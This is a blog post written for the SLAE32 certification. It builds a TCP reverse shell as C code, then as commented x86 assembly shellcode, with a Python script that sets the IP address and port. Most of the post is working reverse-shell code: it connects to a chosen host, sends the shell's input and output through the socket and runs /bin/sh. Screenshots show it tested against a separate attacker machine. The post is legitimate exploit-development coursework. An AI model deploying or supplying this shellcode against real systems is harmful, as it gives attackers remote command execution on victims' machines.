---
title: SLAE32 - Assignment 2 - TCP Reverse Shell
date: 2021-03-14
tags:
- SLAE32
categories:
- SLAE Exam Assignments
- SLAE 32-bit
keywords:
    - Assembly
    - Reverse Shell
---

The second assigment for the SLAE32 certification asks to write a TCP Reverse Shell shellcode that connects to an address and a port and then executes a shell on successful connection. Requirement is that IP address and port number should be easily configurable.
<!--more-->
## TCP Reverse Shell in C
Let's first of all create a TCP reverse shell in C that listens to port 4444 on localhost. This is the code:
``` c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444

int main (){

	// Creating File Descriptor for the Socket
	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

	// Creating sockaddr_in structure for Remote Address
	struct sockaddr_in server;
	server.sin_family = AF_INET;
    	server.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    	server.sin_port = htons(REMOTE_PORT);

	// Connecting to the Server
	int ret = connect(socket_fd, (struct sockaddr *)&server, sizeof(server));

	if (ret == 0)
	{
		// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Socked_FD
		dup2(socket_fd, 0); 
		dup2(socket_fd, 1);
		dup2(socket_fd, 2);
		
		// Invoking EXECVE
		execve("/bin/sh", 0, 0);

		// exit
		return 0;
	}else{
		return ret;
	}
}
```
Trying the shell, we see that it is working as intended:
![Reverse Shell skeleton in C](/writeups/img/slae2-01.png)

## Porting the C code to Assembly
Now, we need to port the C code into Assembly code. Basically, we need to replicate the following syscalls:
* [socket](https://man7.org/linux/man-pages/man2/socket.2.html)
* [connect](https://man7.org/linux/man-pages/man2/connect.2.html)
* [dup2](https://man7.org/linux/man-pages/man2/dup.2.html)
* [execve](https://man7.org/linux/man-pages/man2/execve.2.html)
* [exit](https://man7.org/linux/man-pages/man2/exit.2.html)

In the `Reverse-Shell-StaticParams.nasm` file the original C lines have been kept to provide references and make it more readable at a first glance.  

Let's start and set the registers to zero:
```
; Zeroing the registers	
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

### socket()
The `socket()` function (syscall 359) creates an endpoint for communication. The prototype for this function is defined as follows:
```
int socket(int domain, int type, int protocol);
```
The parameters need to be put in appropriate registers:
* ebx will contain _domain_, set to 2 for "AF_INET" (IPv4 Internet protocols)
* ecx will contain _type_, set to 1 for "SOCK_STREAM" (sequenced, reliable, two-way, connection-based byte streams)
* edx will contain _protocol_, set to 0 (single protocol)

Code implementation is the following:
```
;// Creating File Descriptor for the Socket	
;socket_fd = socket(AF_INET, SOCK_STREAM, 0);
mov ax, 0x167		; #define __NR_socket 359
mov bl, 0x2			; AF_INET = 2
mov cl, 0x1			; SOCK_STREAM = 1
int 0x80			; FD will be stored in eax
```
The return value of the function is the file descriptor that refers to the communication endpoint that has been created, and it will be stored into eax. We will need it for the next syscalls, to we need to copy it somewhere. I have choosen to copy it into edi.
```
mov edi, eax		; Copying socket_fd into edi
xor eax, eax		; Cleaning eax
```

### connect()
The `connect()` function (syscall 362) initiates a connection on a socket. The prototype for this function is defined as follows:
```
int connect(int sockfd, const struct sockaddr *addr,
			socklen_t addrlen);
```
In order to execute the _connect_ we will need to create the *sockaddr* structure in memory with information on the remote address to connect to, which will then be passed to the connect. As we will need to provide also the lenght of the structure in memory, let's first save the current esp into edx:
```
;// Creating sockaddr_in structure for Remote Address
;struct sockaddr_in server;
mov edx, esp		; Saving current SP in edx (will be used to compute size of struct)
```
We need now to push the attributes of sockaddr_in onto the stack *in reverse order*, therefore we are:
* Pushing 8 bytes set to zero and then push the listen address 0.0.0.0 (another 4 zero bytes):
  ```
	; Pushing 8 zero bytes as per struct specifications
	push eax	
	push eax
  ```
* Pushing the remote address to which the connection will be attempted. Here we could have some problems with the shellcode if at least one of the components of the IP address is zero. I have then decided to add a version of the IP address XOR-ed with 0xFFFFFFFF (it is 255.255.255.255 and it is very unlikely that someone connects to that address). Given the basic rule `A XOR B = C,  C XOR B = A` I am then XOR-ing it again in the code in order to retrieve the original IP value without writing zeroes in the shellcode.
  ```
	;server.sin_addr.s_addr = inet_addr(REMOTE_ADDR);	
	mov eax, 0xfeffff80	; XOR-ed Address
	xor eax, 0xFFFFFFFF		
	push eax
	xor eax, eax
  ```
* Pushing the port to bind. We are using port 4444 which is 0x115c Hex. Let's not forget we are using little-endian system, therefore we will push 0x5c11:
  ```
	;server.sin_port = htons(REMOTE_PORT);
	push word 0x5c11	; DEC 4444 -> HEX 0x115c
  ```

* Pushing *sin_family* argument, which is 2 for AF_INET:
  ```
	;server.sin_family = AF_INET;
	push word 0x02		; AF_INET = 2
  ```

Now that we have created the *sockaddr_in* structure in memory we can populate the registers with parameters for the connect() syscall:
* eax is set to 0x16a (DEC 362 which is the syscall number)
* ebx is set with the file descriptor from socket() syscall (stored in edi)
* ecx is set to pointer to the structure in memory (top of the Stack)
* edx, which was set to the top of the stack before creating the *sockaddr_in* structure in memory, is now set to the actual size of the structure by subtracting the new address of the top of the Stack.
```
;/ Connecting to the Server
;int ret = connect(socket_fd, (struct sockaddr *)&server, sizeof(server));
mov ax, 0x16a		; #define __NR_connect 362
mov ebx, edi		; ebx = socket_fd	
mov ecx, esp		; ecx = TOS (Pointer to server_address struct)
sub edx, ecx		; edx = (TOS Before struct) - TOS = size of struct
int 0x80
```

After the syscall, we will have eax set to 0 if the connect() has completed successfully, otherwise eax will contain the error code.
The code is therefore testing eax: if it is zero, the code continues; if eax is different from zero, the execution will jump to *_exit_error* label.
```
; Testing if connect() completed successfully	
test eax, eax		; Testing if EAX is zero
jnz _exit_error		; if eax!=0 exit with error
```

### dup2()
The `dup2()` function (syscall 63) duplicates a file descriptor. The prototype for this function is defined as follows:
```
int dup2(int oldfd, int newfd);
```
We need to execute this syscall 3 times, to duplicate the 3 file descriptors (STDIN, STDOUT and STDERR) to the file descriptor related to the connection socket created in the previous syscall and stored in esi.

Given that we need to perform the same action 3 times, we are then using a loop with ecx as both counter and argument pointing to the 3 standard file descriptors:
```
	;// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Socked_FD
	;dup2(socket_fd, 0); 
	;dup2(socket_fd, 1);
	;dup2(socket_fd, 2);

	xor ecx, ecx		; ecx = 0
	mov cl, 0x3			; will need to loop 3 times. 	
_dup_loop:
	xor eax, eax
	mov al, 0x3f		; #define __NR_dup2 63
	mov ebx, edi		; ebx = socket_fd
	dec cl				; decrease ecx to get actual FD
	int 0x80
	jnz _dup_loop
```

### execve()
The `dup2()` function (syscall 11) executes a program. The prototype for this function is defined as follows:
```
int execve(const char *pathname, char *const argv[],
           char *const envp[]);
```
We will use it in order to start `/bin//sh` (additional '/' is not affecting the command, it has just been added for padding purposes), therefore we need to push it (along with NULL terminator) on the stack. Argument _envp_ (edx) will be a pointer to a null dword and _argv_ (ecx) will be a pointer to the address of _pathname_ 

```
;// Invoking EXECVE
;execve("/bin/sh", NULL, NULL);
xor eax, eax		; eax = 0

push eax		; push eax (0x0 as null terminator)
push 0x68732f2f
push 0x6e69622f		; Push '/bin//sh' (reverse order) onto the stack
mov ebx, esp		; ebx = pointer to TOS (string '/bin//sh')

push eax		; push 0x0
mov edx, esp		; edx = pointer to TOS (null)

push ebx		; push ebx (pointer to string '/bin//sh')
mov ecx, esp		; ecx = pointer to TOS

mov al, 0x0b		; #define __NR_execve 11
int 0x80
```


### exit()
The exit function is very simple and known, its code (which needs to be set into eax) is 1. This is the code used to replicate it in our Assembly code:
```
;// exit
;return 0;
xor eax, eax		; eax = 0
xor ebx, ebx		; ebx = 0
inc eax			; eax = 1 (exit syscall)
int 0x80
```

#### _exit_error label
If the connect() function did not succeed, the program will jump to this point and perform an exit using error code provided by the connect() function and stored in eax:
```
_exit_error:
	;return ret;
	mov ebx, eax		; copying error into ebx
	xor eax, eax		; eax = 0
	inc eax				; eax = 1 (exit syscall)
	int 0x80
```

### Test run
The Assembly code has been compiled and executed; it worked as intended!
![Reverse Shell skeleton in Assembly](/writeups/img/slae2-02.png)

Testing it with the error scenario (e.g. opening a listener on the wrong port) the program does not crash but exits with error (#145, in the screenshot) as intended:
![Reverse Shell skeleton in Assembly - error scenario](/writeups/img/slae2-03.png)


## IP and Port configuration utility
As of now, the connection IP address and port have been hardcoded into the code, but the assignment asks for a configurable shellcode, therefore I have created a small Python3 script which generates the complete shellcode. 

I have generated the shellcode from the compiled nasm file and divided it into two parts (the shellcode before port bytes and the shellcode after port bytes). The `Reverse-Shell-Creator.py` Python script requires 2 parameters: the connection IP and port. It then transforms them in the appropriate format and then prints on the screen:
* selected IP address and related format for the shellcode
* selected port and related format for the shellcode
* the complete shellcode

![Reverse shell - PoC 1 - Step 1](/writeups/img/slae2-04.png)

In order to test the script, I have first loaded the generated shellcode generated in the image above (connection to localhost on port 8081) into a copy of the encrypter utility from Assignment 7 and encrypted it with password 'testme':
![Reverse shell - PoC 1 - Step 2](/writeups/img/slae2-05.png)

The encrypted string has been copied to the decrypt-exec utility and then executed. As shown in the screenshot, the shell has executed successfully:
![Reverse shell - PoC 1 - Step 3](/writeups/img/slae2-06.png)

I have then run another PoC (files in `Assignment-2/PoC/Another_PoC`) to test connection to another machine (a separate Kali box on my computer):
* Screenshot on the _target_ machine:
  ![Reverse shell - PoC 2 - Target machine](/writeups/img/slae2-07.png)
* Screenshot on the _attacker_ machine:
  ![Reverse shell - PoC 2 - Attacker machine](/writeups/img/slae2-08.png)


<!-- SLAE32 Disclaimer -->
_________________
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

**Student ID**: `SLAE - 1547`  
**GitHub repository**: [https://github.com/andrea-perfetti/SLAE32-Exam](https://github.com/andrea-perfetti/SLAE32-Exam)

This assignment has been written on a Kali Linux 2021.1 x86 virtual machine:
```
┌──(kali㉿kali)-[~]
└─$ uname -a 
Linux kali 5.10.0-kali3-686-pae #1 SMP Debian 5.10.13-1kali1 (2021-02-08) i686 GNU/Linux
```